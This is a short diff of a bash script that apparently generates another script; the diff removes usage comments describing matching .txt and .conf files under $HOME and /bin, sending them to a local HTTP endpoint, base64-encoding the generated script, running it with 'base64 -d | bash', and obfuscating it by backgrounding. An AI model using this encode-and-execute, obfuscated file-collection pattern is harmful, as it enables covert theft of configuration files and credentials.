@@ -1,8 +1,4 @@
 #!/bin/bash
-# Generation example: ./script.sh "(.*?)\.(txt|conf)" "\$HOME /bin" 4096 http://127.0.0.1:8000 > scriptt.sh
-# To encode: encoded=$(cat scriptt.sh | base64| tr -d '\n' )
-# To execute the encoded base64:  base64 -d <<< ${encoded} | bash
-# To obfuscate: https://stackoverflow.com/questions/3683910/executing-shell-command-in-background-from-script#answer-29681504
 
 echo "#!/bin/bash
 
